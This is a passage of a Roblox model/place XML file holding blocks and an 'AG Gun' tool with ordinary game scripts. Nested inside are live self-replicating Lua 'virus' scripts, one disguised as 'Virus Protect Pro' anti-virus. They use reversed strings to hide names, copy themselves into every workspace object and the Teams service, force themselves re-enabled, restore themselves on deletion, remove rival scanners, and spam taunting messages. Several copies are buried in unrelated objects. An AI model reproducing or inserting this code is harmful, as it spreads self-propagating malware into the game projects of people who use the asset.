					</Properties>
				</Item>
				<Item class="Geometry" referent="RBX84">
					<Properties>
						<string name="Name">ORLY</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
		<Item class="Part" referent="RBX85">
			<Properties>
				<bool name="Anchored">true</bool>
				<float name="BackParamA">-0.5</float>
				<float name="BackParamB">0.5</float>
				<token name="BackSurface">0</token>
				<token name="BackSurfaceInput">0</token>
				<float name="BottomParamA">-0.5</float>
				<float name="BottomParamB">0.5</float>
				<token name="BottomSurface">4</token>
				<token name="BottomSurfaceInput">0</token>
				<int name="BrickColor">5</int>
				<CoordinateFrame name="CFrame">
					<X>29.5</X>
					<Y>9.10000038</Y>
					<Z>-24</Z>
					<R00>1</R00>
					<R01>0</R01>
					<R02>0</R02>
					<R10>0</R10>
					<R11>1</R11>
					<R12>0</R12>
					<R20>0</R20>
					<R21>0</R21>
					<R22>1</R22>
				</CoordinateFrame>
				<bool name="CanCollide">true</bool>
				<bool name="DraggingV1">false</bool>
				<float name="Elasticity">0.5</float>
				<token name="FormFactor">1</token>
				<float name="Friction">0.300000012</float>
				<float name="FrontParamA">-0.5</float>
				<float name="FrontParamB">0.5</float>
				<token name="FrontSurface">0</token>
				<token name="FrontSurfaceInput">0</token>
				<float name="LeftParamA">-0.5</float>
				<float name="LeftParamB">0.5</float>
				<token name="LeftSurface">0</token>
				<token name="LeftSurfaceInput">0</token>
				<bool name="Locked">false</bool>
				<token name="Material">256</token>
				<string name="Name">Smooth Block Model</string>
				<float name="Reflectance">0</float>
				<float name="RightParamA">-0.5</float>
				<float name="RightParamB">0.5</float>
				<token name="RightSurface">0</token>
				<token name="RightSurfaceInput">0</token>
				<Vector3 name="RotVelocity">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
				</Vector3>
				<float name="TopParamA">-0.5</float>
				<float name="TopParamB">0.5</float>
				<token name="TopSurface">3</token>
				<token name="TopSurfaceInput">0</token>
				<float name="Transparency">0</float>
				<Vector3 name="Velocity">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
				</Vector3>
				<bool name="archivable">true</bool>
				<token name="shape">1</token>
				<Vector3 name="size">
					<X>1</X>
					<Y>15.6000004</Y>
					<Z>26</Z>
				</Vector3>
			</Properties>
			<Item class="VelocityMotor" referent="RBX86">
				<Properties>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<float name="CurrentAngle">0</float>
					<float name="DesiredAngle">0</float>
					<Ref name="Hole">null</Ref>
					<float name="MaxVelocity">0</float>
					<string name="Name">ViVRuS</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Geometry" referent="RBX87">
					<Properties>
						<string name="Name">ViVRuS</string>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="RotateP" referent="RBX88">
						<Properties>
							<float name="BaseAngle">1.14835947e-038</float>
							<CoordinateFrame name="C0">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
								<R00>1</R00>
								<R01>0</R01>
								<R02>0</R02>
								<R10>0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>0</R20>
								<R21>0</R21>
								<R22>1</R22>
							</CoordinateFrame>
							<CoordinateFrame name="C1">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
								<R00>1</R00>
								<R01>0</R01>
								<R02>0</R02>
								<R10>0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>0</R20>
								<R21>0</R21>
								<R22>1</R22>
							</CoordinateFrame>
							<string name="Name">ViVRuS</string>
							<Ref name="Part0">null</Ref>
							<Ref name="Part1">null</Ref>
							<bool name="archivable">true</bool>
						</Properties>
						<Item class="Script" referent="RBX89">
							<Properties>
								<bool name="Disabled">false</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">AntiVirusSoftware</string>
								<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX90">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX91">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="Geometry" referent="RBX92">
					<Properties>
						<string name="Name">ORLY</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
		<Item class="Tool" referent="RBX93">
			<Properties>
				<bool name="Enabled">true</bool>
				<CoordinateFrame name="Grip">
					<X>0</X>
					<Y>-1</Y>
					<Z>0.25</Z>
					<R00>1</R00>
					<R01>0</R01>
					<R02>0</R02>
					<R10>0</R10>
					<R11>1</R11>
					<R12>0</R12>
					<R20>0</R20>
					<R21>0</R21>
					<R22>1</R22>
				</CoordinateFrame>
				<string name="Name">AG Gun</string>
				<Content name="TextureId"><null></null></Content>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Script" referent="RBX94">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Gravity</string>
					<ProtectedString name="Source">local parts = {}
local db = false

function drop()
	if script.Parent.BodyVelocity.velocity.y &gt; -100 then
		script.Parent.BodyVelocity.velocity = script.Parent.BodyVelocity.velocity - Vector3.new(0,1,0)
	end
end

function findBrick(obj)
	if obj.className == &quot;Part&quot; and obj.Anchored == false then
		local pos = script.Parent.Position
		local opos = obj.Position
		local x = pos.x - opos.x
		local z = pos.z - opos.z
		local y = math.abs(opos.y - pos.y)
		local relx = math.abs(x)
		local relz = math.abs(z)
		local mag = relx + relz
		if mag &lt;= 25 and y &lt;= 10 then
			table.insert(parts, obj)
		end
	elseif obj.className == &quot;Model&quot; or obj.className == &quot;Tool&quot; or obj == workspace then
		local c = obj:GetChildren()
		for i = 1, #c do
			findBrick(c[i])
		end
	end
end

function mesh()
	for i = 1, #parts do
		parts[i]:BreakJoints()
		local bf = Instance.new(&quot;BodyForce&quot;)
		bf.force = Vector3.new(0,parts[i]:GetMass() * 250,0)
		bf.Parent = parts[i]
	end
	for i = 1, 100 do
		script.Parent.Mesh.Scale = script.Parent.Mesh.Scale + Vector3.new((50 - 10) / 100,0,(50 - 10) / 100)
		script.Parent.Transparency = script.Parent.Transparency + (0.01)
		wait(0.01)
	end
	for i = 1, #parts do
		parts[i]:Remove()
	end
	script.Parent:Remove()
end

function onHit()
	if db == true then
		return
	end

	connection:disconnect()
	db = true
	script.Parent.CFrame = CFrame.new(0,0,0) + script.Parent.Position
	script.Parent.BodyVelocity:Remove()
	script.Parent.Anchored = true
	local m = Instance.new(&quot;SpecialMesh&quot;)
	m.MeshType = &quot;Sphere&quot;
	m.Scale = Vector3.new(1,0.1,1)
	m.Parent = script.Parent
	findBrick(workspace)
	mesh()
end

connection = script.Parent.Touched:connect(onHit)

while (script.Parent:FindFirstChild(&quot;BodyVelocity&quot;)) ~= nil do
	drop()
	wait(0.1)
end
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="LocalScript" referent="RBX95">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">LocalGui</string>
					<ProtectedString name="Source">local enabled = true

function onButton1Down(mouse)
	if enabled == false then
		return
	end

	enabled = false

	mouse.Icon = &quot;rbxasset://textures\\GunWaitCursor.png&quot;

	wait(15)
	
	enabled = true

	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
end

function onSelect(mouse)
	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
end

script.Parent.Equipped:connect(onSelect)
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX96">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">WeldScript</string>
					<ProtectedString name="Source">local hand = script.Parent.Handle
local h1 = script.Parent.H1
local h2 = script.Parent.H2
local h3 = script.Parent.H3
local h4 = script.Parent.H4
local h5 = script.Parent.H5
local h6 = script.Parent.H6
local h7 = script.Parent.H7
local h8 = script.Parent.H8
local parts = {h1, h2, h3, h4, h5, h6, h7, h8}

function onWeld()
	local c = hand:GetChildren()
	for i = 1, #c do
		if c[i].className == &quot;Weld&quot; then
			c[i]:Remove()
		end
	end
	for i = 1, #parts do
		local w = Instance.new(&quot;Weld&quot;)
		w.Parent = hand
		w.Part0 = hand
		w.Part1 = parts[i]
		w.C0 = script[parts[i].Name].Value
	end
end

script.Parent.Equipped:connect(onWeld)
script.Parent.Unequipped:connect(onWeld)
	</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="CFrameValue" referent="RBX97">
					<Properties>
						<string name="Name">H1</string>
						<CoordinateFrame name="Value">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>-0.50000006</R00>
							<R01>-0.866025388</R01>
							<R02>0</R02>
							<R10>0.866025388</R10>
							<R11>-0.50000006</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="CFrameValue" referent="RBX98">
					<Properties>
						<string name="Name">H2</string>
						<CoordinateFrame name="Value">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>-0.499999911</R00>
							<R01>0.866025448</R01>
							<R02>0</R02>
							<R10>-0.866025448</R10>
							<R11>-0.499999911</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="CFrameValue" referent="RBX99">
					<Properties>
						<string name="Name">H3</string>
						<CoordinateFrame name="Value">
							<X>0</X>
							<Y>0</Y>
							<Z>-0.75</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>0.000796274282</R11>
							<R12>-0.999999702</R12>
							<R20>0</R20>
							<R21>0.999999702</R21>
							<R22>0.000796274282</R22>
						</CoordinateFrame>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="CFrameValue" referent="RBX100">
					<Properties>
						<string name="Name">H4</string>
						<CoordinateFrame name="Value">
							<X>0</X>
							<Y>0</Y>
							<Z>1.75</Z>
							<R00>0.000796274282</R00>
							<R01>0</R01>
							<R02>0.999999702</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>-0.999999702</R20>
							<R21>0</R21>
							<R22>0.000796274282</R22>
						</CoordinateFrame>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="CFrameValue" referent="RBX101">
					<Properties>
						<string name="Name">H5</string>
						<CoordinateFrame name="Value">
							<X>0</X>
							<Y>-0.75</Y>
							<Z>0.5</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>0.921060979</R11>
							<R12>0.389418334</R12>
							<R20>0</R20>
							<R21>-0.389418334</R21>
							<R22>0.921060979</R22>
						</CoordinateFrame>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="CFrameValue" referent="RBX102">
					<Properties>
						<string name="Name">H6</string>
						<CoordinateFrame name="Value">
							<X>0</X>
							<Y>-1.35000038</Y>
							<Z>0.700000048</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>0.921060979</R11>
							<R12>0.389418334</R12>
							<R20>0</R20>
							<R21>-0.389418334</R21>
							<R22>0.921060979</R22>
						</CoordinateFrame>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="CFrameValue" referent="RBX103">
					<Properties>
						<string name="Name">H7</string>
						<CoordinateFrame name="Value">
							<X>0</X>
							<Y>0</Y>
							<Z>-1.75</Z>
							<R00>0.000796274282</R00>
							<R01>0</R01>
							<R02>0.999999702</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>-0.999999702</R20>
							<R21>0</R21>
							<R22>0.000796274282</R22>
						</CoordinateFrame>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="CFrameValue" referent="RBX104">
					<Properties>
						<string name="Name">H8</string>
						<CoordinateFrame name="Value">
							<X>0</X>
							<Y>0</Y>
							<Z>1</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>0.707106769</R11>
							<R12>-0.707106769</R12>
							<R20>0</R20>
							<R21>0.707106769</R21>
							<R22>0.707106769</R22>
						</CoordinateFrame>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="Script" referent="RBX105">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Matter Flyer</string>
					<ProtectedString name="Source">local enabled = true
local battery = 5 -- Set this to whatever, lower than fullbattery
local fullbattery = 5 -- Set this to the max battery
local ball = Instance.new(&quot;Part&quot;)
local h = Instance.new(&quot;Hint&quot;)
ball.Shape = 0
ball.TopSurface = 0
ball.BottomSurface = 0
ball.BrickColor = script.Parent.H4.BrickColor
ball.Size = Vector3.new(1,1,1)
ball.Locked = true
ball.CanCollide = false

--[[ Now for the fun part.
	Time to make it shoot! ]]

function fire()
	if battery &gt; 0 and enabled == true then
		enabled = false
		local b = ball:Clone()
		b.Parent = workspace
		local targ = script.Parent.Parent.Humanoid.TargetPoint - script.Parent.H3.Position
		local dir = targ / targ.magnitude
		local pos = script.Parent.H3.Position + (dir * 4)
		local cfr = CFrame.new(pos, pos + dir)
		b.CFrame = cfr
		local bv = Instance.new(&quot;BodyVelocity&quot;)
		bv.velocity = dir * 150
		bv.Parent = b
		local s = script.Parent.Gravity:Clone()
		s.Disabled = false
		s.Parent = b
		decrease()
		wait(15)
		enabled = true
	elseif battery == 0 then
		h.Text = &quot;Out of energy!&quot;
	elseif battery &lt; 0 then
		h.Text = &quot;Oh no! It&apos;s about to explode!&quot;
		wait(1.5)
		h.Text = &quot;KABOOM!&quot;
		explode()
	end
end

function explode()
	local e = Instance.new(&quot;Explosion&quot;)
	e.Parent = workspace
	e.BlastRadius = 10
	e.BlastPressure = 1e+005
	e.Position = script.Parent.Handle.Position
end

function decrease()
	battery = battery - 1
	script.Parent.H4.Transparency = script.Parent.H4.Transparency + (0.75 / fullbattery)
	h.Text = &quot;Energy: [&quot;
	for i = 1, battery do
		h.Text = h.Text .. &quot;|&quot;
	end
	for i = 1, fullbattery - battery do
		h.Text = h.Text .. &quot; &quot;
	end
	h.Text = h.Text .. &quot;]&quot;
end

function unequipped()
	h.Parent = nil
end

function equipped()
	h.Parent = game.Players:GetPlayerFromCharacter(script.Parent.Parent)
		h.Text = &quot;Energy: [&quot;
	for i = 1, battery do
		h.Text = h.Text .. &quot;|&quot;
	end
	for i = 1, fullbattery - battery do
		h.Text = h.Text .. &quot; &quot;
	end
	h.Text = h.Text .. &quot;]&quot;
end

script.Parent.Activated:connect(fire)
script.Parent.Equipped:connect(equipped)
script.Parent.Unequipped:connect(unequipped)</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Timer" referent="RBX106">
				<Properties>
					<string name="Name">ViVRuS</string>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Weld" referent="RBX107">
					<Properties>
						<CoordinateFrame name="C0">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<CoordinateFrame name="C1">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<string name="Name">ViVRuS</string>
						<Ref name="Part0">null</Ref>
						<Ref name="Part1">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Geometry" referent="RBX108">
						<Properties>
							<string name="Name">ViVRuS</string>
							<bool name="archivable">true</bool>
						</Properties>
						<Item class="Script" referent="RBX109">
							<Properties>
								<bool name="Disabled">false</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">AntiVirusSoftware</string>
								<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX110">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">Hello...I &#229;m Your New Lord Lolz</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX111">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="Geometry" referent="RBX112">
					<Properties>
						<string name="Name">ORLY</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="Geometry" referent="RBX113">
					<Properties>
						<string name="Name">ViVRuS</string>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Geometry" referent="RBX114">
						<Properties>
							<string name="Name">ViVRuS</string>
							<bool name="archivable">true</bool>
						</Properties>
						<Item class="Weld" referent="RBX115">
							<Properties>
								<CoordinateFrame name="C0">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
									<R00>1</R00>
									<R01>0</R01>
									<R02>0</R02>
									<R10>0</R10>
									<R11>1</R11>
									<R12>0</R12>
									<R20>0</R20>
									<R21>0</R21>
									<R22>1</R22>
								</CoordinateFrame>
								<CoordinateFrame name="C1">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
									<R00>1</R00>
									<R01>0</R01>
									<R02>0</R02>
									<R10>0</R10>
									<R11>1</R11>
									<R12>0</R12>
									<R20>0</R20>
									<R21>0</R21>
									<R22>1</R22>
								</CoordinateFrame>
